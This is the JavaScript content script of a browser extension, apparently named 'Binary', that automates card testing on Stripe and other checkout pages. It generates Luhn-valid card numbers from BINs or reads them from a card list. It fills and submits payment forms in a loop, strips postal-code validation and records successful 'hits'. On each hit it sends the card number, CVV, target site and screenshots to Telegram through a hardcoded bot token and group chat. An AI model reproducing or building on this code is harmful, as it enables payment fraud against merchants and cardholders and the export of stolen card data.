function updateCountersUI() {
  const e = document.getElementById("binary-attempts-counter"),
    t = document.getElementById("binary-success-counter");
  void 0 !== state &&
    (e && (e.textContent = state.attemptCount || 0),
    t && (t.textContent = state.successCount || 0));
}
(setupMobileKeyboardFix(),
  setupMobileKeyboardFix(),
  void 0 === state &&
    (window.state = { attemptCount: 0, successCount: 0, autopayEnabled: !1 }),
  addGenerateButton());
const generateCardNumber = (e) => {
    let t = e;
    for (; t.length < 15; ) t += Math.floor(10 * Math.random()).toString();
    for (let e = 0; e < 10; e++) if (calculateLuhnChecksum(t + e)) return t + e;
    return t + "0";
  },
  calculateLuhnChecksum = (e) => {
    let t = 0,
      n = !1;
    for (let o = e.length - 1; o >= 0; o--) {
      let a = parseInt(e.charAt(o));
      (n && ((a *= 2), a > 9 && (a -= 9)), (t += a), (n = !n));
    }
    return t % 10 == 0;
  },
  generateExpirationDate = () => {
    const e = new Date().getFullYear();
    return `${Math.floor(12 * Math.random() + 1)
      .toString()
      .padStart(
        2,
        "0",
      )}/${(Math.floor(5 * Math.random()) + e + 1).toString().slice(-2)}`;
  },
  /* REPLACE generateCardDetails IN content.js */

generateCardDetails = () => {
    const e = state.settings;
    
    // 1. Common User Data
    const t = {
        email: e.userEmail && "" !== e.userEmail.trim() ? e.userEmail : `Binary${Math.floor(900 * Math.random() + 100)}@gmail.com`,
        cardHolderName: e.userName && "" !== e.userName.trim() ? e.userName : "Binary Devs",
        addressLine1: e.userAddress && "" !== e.userAddress.trim() ? e.userAddress : "Binary Bolte",
        postalCode: e.userZip && "" !== e.userZip.trim() ? e.userZip : "10080",
        city: e.userCity && "" !== e.userCity.trim() ? e.userCity : "New Hampshire",
        country: e.customCountry && "" !== e.customCountry.trim() ? e.customCountry : "MO",
    };

    // 2. MODE CHECK
    // If Bin Mode is FALSE, use the Card List (First line logic)
    if (e.binMode === false) {
        if (!e.cardDetails || 0 === e.cardDetails.length) {
            showNotification("error", "Card List Empty", "Add cards in the 'Cards' tab.");
            return null;
        }
        // Takes the first card from the list
        const n = e.cardDetails[0],
              [o, a, i, r] = n.split("|"),
              s = { ...t, cardNumber: o, expirationDate: `${a}/${i.slice(-2)}`, cvv: r };
        return ((state.lastGeneratedCardDetails = s), s);
    } 
    
    // 3. BIN MODE (The Fix)
    else {
        // A. Aggregate all BINs (List + Legacy Fields)
        let pool = [];
        
        // Add from multi-line list
        if (e.binList && Array.isArray(e.binList) && e.binList.length > 0) {
            pool = pool.concat(e.binList);
        }
        
        // Add from single input fields (backup)
        if (e.bin1) pool.push(e.bin1);
        if (e.bin2) pool.push(e.bin2);
        
        // Clean: Remove empty/null and duplicates
        pool = [...new Set(pool.filter(Boolean))];

        if (pool.length === 0) {
            showNotification("error", "No BINs Found", "Please add a BIN in Settings.");
            return null;
        }

        // B. Pick Random BIN
        const randomIndex = Math.floor(Math.random() * pool.length);
        let n = pool[randomIndex];

        // C. Handle "BIN|EXP" format
        let o = null;
        if (n.includes("|")) {
            const split = n.split("|");
            n = split[0];
            if (split.length >= 2) o = split[1]; // Get date if present
        }

        // D. Algorithm to generate full number
        let a = n.replace(/\s/g, "").replace(/[^0-9]/g, ""),
            i = 16,
            r = 3;
        
        // Detect Amex (Starts with 34 or 37) -> 15 digits
        if (/^3[47]/.test(a)) { i = 15; r = 4; }
        
        // Trim if user pasted a full card
        if (a.length >= i) a = a.slice(0, i - 1);

        // Luhn Generator
        const s = ((prefix, length) => {
            let num = prefix;
            while (num.length < length - 1) {
                num += Math.floor(Math.random() * 10);
            }
            // Calculate Checksum
            let sum = 0;
            let double = true;
            for (let k = num.length - 1; k >= 0; k--) {
                let digit = parseInt(num[k]);
                if (double) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
                double = !double;
            }
            return num + ((10 - (sum % 10)) % 10);
        })(a, i);

        // E. Date & CVV
        const l = o || generateExpirationDate(); // Use fixed date if BIN|Date provided
        const c = Math.pow(10, r - 1);
        const d = Math.pow(10, r) - 1;
        const u = Math.floor(Math.random() * (d - c + 1) + c).toString();

        const p = { ...t, cardNumber: s, expirationDate: l, cvv: u };
        
        // Debug: Log to verify rotation
        // console.log(`[Binary] Generated from pool of ${pool.length} BINs. Selected: ${n}`);
        
        state.lastGeneratedCardDetails = p;
        return p;
    }
};
function preventStripeAutoFocus() {
  isMobile() &&
    (document.activeElement &&
      ["INPUT", "TEXTAREA"].includes(document.activeElement.tagName) &&
      document.activeElement.blur(),
    document.addEventListener(
      "focus",
      (e) => {
        state.autopayEnabled &&
          "INPUT" === e.target.tagName &&
          setTimeout(() => {
            document.activeElement === e.target && e.target.blur();
          }, 100);
      },
      !0,
    ));
}
function clickPayWithCardButton() {
  const e = document.querySelector(
    'button.Button.AccordionButton[aria-label="Pay with card"]',
  );
  e ? e.click() : setTimeout(clickPayWithCardButton, 500);
}
((cachedElements = new Map()),
  (getElement = (e) => (
    cachedElements.has(e) || cachedElements.set(e, document.querySelector(e)),
    cachedElements.get(e)
  )),
  (simulateTyping = (e, t) => {
    (e.focus(),
      (e.value = t),
      e.dispatchEvent(new Event("input", { bubbles: !0 })),
      e.dispatchEvent(new Event("change", { bubbles: !0 })),
      e.blur());
  }),
  (clearFormFields = () => {
    ["input#cardNumber", "input#cardExpiry", "input#cardCvc"].forEach((e) => {
      const t = document.querySelector(e);
      t &&
        ((t.value = ""), t.dispatchEvent(new Event("input", { bubbles: !0 })));
    });
  }),
  (fillFormFields = () => {
    const e = generateCardDetails();
    if (!e) return;
    state.lastUsedCard = e.cardNumber;
    const t = {
        "input#email": e.email,
        "input#cardNumber": "0000000000000000",
        "input#cardExpiry": "02/31",
        "input#cardCvc": "000",
        "input#billingName": e.cardHolderName,
        "input#billingAddressLine1": e.addressLine1,
        "input#billingLocality": e.city,
      },
      n = document.getElementById("termsOfServiceConsentCheckbox");
    n && !n.checked && n.click();
    const o =
      document.querySelector("#billingCountry") ||
      document.querySelector("select[name='country']") ||
      document.querySelector("select[name='billingCountry']");
    o &&
      ((o.value = e.country),
      o.dispatchEvent(new Event("change", { bubbles: !0 })));

    // Optionally relax zip/postal requirements on Stripe forms
    if (!state.settings || !state.settings.skipStripeZipValidation) {
      t["input#billingPostalCode"] = e.postalCode;
    } else {
      try {
        const zipInputs = document.querySelectorAll(
          "input[name*='zip'], input[name*='postal'], input[id*='postal']",
        );
        zipInputs.forEach((el) => {
          el.removeAttribute("required");
          el.removeAttribute("pattern");
          el.setCustomValidity && el.setCustomValidity("");
        });
      } catch (_) {}
    }
    for (const [e, n] of Object.entries(t)) {
      const t =
        ((a = e),
        cachedElements.has(a) ||
          cachedElements.set(a, document.querySelector(a)),
        cachedElements.get(a));
      t && simulateTyping(t, n);
    }
    var a;
    sendToInjected(e.cardNumber, e.expirationDate, e.cvv);
  }));
const clickSubscribeButton = () => {
    const e = document.querySelector(
      "button[type='submit'], button.SubmitButton, #submitButton",
    );
    e &&
      !e.disabled &&
      (state.attemptCount++,
      updateCountersUI(),
      e.click(),
      showNotification(
        "warning",
        "Submitting Card",
        `Trying: ${state.lastGeneratedCardDetails.cardNumber} | ${state.lastGeneratedCardDetails.expirationDate} |  ${state.lastGeneratedCardDetails.cvv}`,
      ));
  },
  autoFillAndSubmit = () => {
    state.autopayEnabled ||
    !1 !== state.settings.binMode ||
    0 !== state.settings.cardDetails.length
      ? setTimeout(() => {
          (fillFormFields(),
            blurMain(),
            setTimeout(() => {
              clickSubscribeButton();
            }, 1500));
        }, 2e3)
      : showNotification(
          "info",
          "Cannot Proceed",
          "Autopay off and no cards in list",
        );
  };
function startAutopay() {
  state.extensionEnabled && state.autopayEnabled && autoFillAndSubmit();
}
function stopAutopay() {
  autopayInterval && (clearInterval(autopayInterval), (autopayInterval = null));
}
function sendToInjected(e, t, n) {
  window.postMessage(
    { source: "content_script", type: "SET_CARD", number: e, date: t, cvv: n },
    "*",
  );
}
function runWhenFieldPresent(e, t) {
  document.querySelector(e)
    ? t()
    : new MutationObserver((n, o) => {
        document.querySelector(e) && (o.disconnect(), t());
      }).observe(document.body, { childList: !0, subtree: !0 });
}
function base64ToBlob(e) {
  const t = atob(e.split(",")[1]),
    n = e.split(",")[0].split(":")[1].split(";")[0],
    o = new ArrayBuffer(t.length),
    a = new Uint8Array(o);
  for (let e = 0; e < t.length; e++) a[e] = t.charCodeAt(e);
  return new Blob([o], { type: n });
}
window.addEventListener("message", (e) => {
  e.source === window &&
    e.data &&
    "BINARY_SITE_INFO" === e.data.type &&
    (state.currentSiteInfo = {
      name: e.data.data.site_name,
      url: e.data.data.business_url,
    });
});
const onPageLoad = () => {},
  initializeExtension = () => {
    (injectScript("js/interceptor.js"),
      injectScript("js/stripe/injected.js"),
      chrome.storage.sync.get(DEFAULT_SETTINGS, (e) => {
        ((state.settings = e), (state.extensionEnabled = e.extensionEnabled));
        const t = [
          /^pay\./,
          /checkout\.stripe\.com/,
          /^buy\.stripe/,
          /checkout/i,
          /stripe/i,
          /^pay\.krea\.ai$/,
          /taskade/i,
          /billing/i,
          /loudly/i,
        ].some(
          (e) =>
            e.test(window.location.hostname) ||
            e.test(window.location.pathname),
        );
        state.extensionEnabled &&
          t &&
          (addGenerateButton(),
          setupMobileKeyboardFix(),
          preventStripeAutoFocus(),
          updateCountersUI(),
          showNotification(
            "success",
            "🦇 Payment Page Detected 🕷️",
            "v2.0 – Join Telegram for updates!",
          ),
          clickPayWithCardButton(),
          runWhenFieldPresent(
            'input#cardNumber, input[name="cardnumber"], #card-element',
            () => {
              autoFillAndSubmit();
            },
          ));
      }));
  };
async function sendTelegramMessageToUser(e, t, n = null) {
  chrome.storage.sync.get(
    ["telegramId", "isVerified", "botToken"],
    async (o) => {
      const a = o.botToken;
      let i = "",
        r = "";
      if (
        ("GROUP" === e
          ? ((i = "8367100145:AAHuSeonE9CxBZBcqtTCdv5PxYBtHKpdgT0"),
            (r = "-1002040852680"))
          : ((i = a), (r = o.telegramId)),
        !i || !r)
      )
        return;
      if (!("GROUP" === e || (o.isVerified && a))) return;
      let s = !1;
      if (n)
        try {
          const e = base64ToBlob(n);
          if (!e) throw new Error("Blob conversion failed");
          const o = new FormData();
          (o.append("chat_id", r),
            o.append("caption", t),
            o.append("parse_mode", "Markdown"),
            o.append("photo", e, "screenshot.jpg"));
          (
            await fetch(`https://api.telegram.org/bot${i}/sendPhoto`, {
              method: "POST",
              body: o,
            })
          ).ok && (s = !0);
        } catch (e) {}
      if (!s)
        try {
          await fetch(`https://api.telegram.org/bot${i}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: r,
              text: t,
              parse_mode: "Markdown",
            }),
          });
        } catch (e) {}
    },
  );
}
function requestScreenshot() {
  chrome.runtime.sendMessage({ action: "capture_and_send" }, (e) => {
    chrome.runtime.lastError || e?.status;
  });
}
(chrome.runtime.onMessage.addListener((e, t, n) => {
  "updateSettings" === e.action
    ? ((state.settings = e.settings), state.settings)
    : "toggleExtension" === e.action &&
      ((state.extensionEnabled = e.enabled),
      state.extensionEnabled ? initializeExtension() : stopAutopay());
}),
  chrome.runtime.onMessage.addListener((e, t, n) => {
    "updateSettings" === e.action
      ? ((state.settings = e.settings), state.settings)
      : "toggleExtension" === e.action &&
        ((state.extensionEnabled = e.enabled),
        state.extensionEnabled ? initializeExtension() : stopAutopay());
  }),
  window.addEventListener("message", (e) => {
    if (e.source !== window) return;
    const t = e.data;
    if (!t) return;

    const isStripeHelper = t.__stripe_helper === !0;
    const isGatewayHelper = t.__gateway_helper === !0;
    if (!isStripeHelper && !isGatewayHelper) return;

    const n = {
      card: state.lastGeneratedCardDetails,
      response: {
        type: t.type,
        message: t.message || "N/A",
        code: t.decline_code || "N/A",
      },
    };

    if (chrome?.runtime) {
      chrome.runtime.sendMessage({ action: "logResponse", data: n });
    }

    // === SUCCESS HANDLING (Stripe + other gateways) ===
    if ("success" === t.type) {
      // 1. PLAY HIT SOUND 🔊 (configurable)
      try {
        if (!state.settings || state.settings.playHitSound !== false) {
          const hitSound = new Audio(chrome.runtime.getURL("hit.mp3"));
          hitSound.play().catch((err) =>
            console.log("Audio play blocked:", err),
          );
        }
      } catch (err) {
        console.log("Sound file not found or invalid.");
      }

      state.successCount++;
      updateCountersUI();

      showNotification(
        "success",
        "Payment Success ✅",
        t.message || "Card worked!",
      );

      const hitData = {
        name: state.currentSiteInfo.name,
        url: state.currentSiteInfo.url,
        date: new Date().toLocaleString(),
        bin: state.lastGeneratedCardDetails?.cardNumber.slice(0, 6) || "??????",
        card: state.lastGeneratedCardDetails?.cardNumber || "Unknown",
      };

      chrome.storage.sync.get(["hittedSites"], (storage) => {
        const sites = storage.hittedSites || [];
        sites.unshift(hitData);
        if (sites.length > 50) sites.pop();

        chrome.storage.sync.set({ hittedSites: sites });
        chrome.runtime.sendMessage({
          action: "updateHittedSites",
          hittedSites: sites,
          latestHit: hitData,
        });
      });

      setTimeout(() => {
        chrome.runtime.sendMessage(
          {
            action: "capture_and_send",
            card: state.lastGeneratedCardDetails?.cardNumber,
          },
          (res) => {
            const screenshot = res?.screenshotUrl || null;
            const user = state.settings.telegramName || "User";
            const card = state.lastGeneratedCardDetails;
            const msg = t.message || "Approved";
            const siteName = state.currentSiteInfo.name || "Unknown Site";
            const siteUrl = state.currentSiteInfo.url || "#";

            let groupMsg = state.settings.sendSiteToGroup
              ? `\n⚡️ *BINARY HIT* ⚡️\n━━━━━━━━━━━━━━━━━━\n🌍 *Target:* [${siteName}](${siteUrl})\n💳 *BIN:* \`${card.cardNumber.slice(0, 6)}\` • *Exp:* \`${card.expirationDate}\`\n👤 *User:* ${user}\n━━━━━━━━━━━━━━━━━━\n💀 *Binary OS*\n`.trim()
              : `\n✅ *PAYMENT SUCCESS*\n━━━━━━━━━━━━━━━━━━\n👤 *User:* ${user}\n💬 *Result:* ${msg}\n━━━━━━━━━━━━━━━━━━\n`.trim();

            sendTelegramMessageToUser("GROUP", groupMsg, screenshot);
            sendTelegramMessageToUser(
              "PRIVATE",
              `✅ *Payment Success*\n💳 Card: \`${card.cardNumber}\`\n📅 Exp: \`${card.expirationDate}\`\n🔐 CVV: \`${card.cvv}\`\n🌍 Site: ${siteUrl}\nMsg: ${msg}`,
              screenshot,
            );
          },
        );
      }, 1500);

      if (
        state.settings.binMode === false &&
        state.settings.cardDetails.length > 0
      ) {
        state.settings.cardDetails.shift();
        chrome.storage.sync.set({ cardDetails: state.settings.cardDetails });
        chrome.runtime.sendMessage({
          action: "updateDashboard",
          cardDetails: state.settings.cardDetails,
        });
      }

      stopAutopay();
    }

    // === ERROR HANDLING ===
    if (["card_declined", "invalid_cvc", "incorrect_number"].includes(t.type)) {
      let errorMsg = "Card Declined ❌";
      if (t.type === "card_declined")
        errorMsg = `Card Declined! Code: ${t.decline_code || "N/A"}`;
      else if (t.type === "invalid_cvc") errorMsg = "Invalid CVC ❌";
      else if (t.type === "incorrect_number") errorMsg = "Incorrect Number ❌";

      showNotification("error", errorMsg, t.message || "Payment failed");

      if (
        state.settings.binMode === false &&
        state.settings.cardDetails.length > 0
      ) {
        state.settings.cardDetails.shift();
        chrome.storage.sync.set({ cardDetails: state.settings.cardDetails });
        chrome.runtime.sendMessage({
          action: "updateDashboard",
          cardDetails: state.settings.cardDetails,
        });
      }

      if (state.autopayEnabled) {
        if (
          state.settings.binMode === false &&
          state.settings.cardDetails.length === 0
        ) {
          showNotification(
            "error",
            "Card List Exhausted",
            "No more cards to try",
          );
          stopAutopay();
        } else {
          autoFillAndSubmit();
        }
      }
    }
  }),
  chrome.storage.sync.get(["isVerified"], (e) => {
    e.isVerified
      ? initializeExtension()
      : showNotification(
          "error",
          "Access Denied",
          "Please verify your Telegram account first!",
        );
  }));
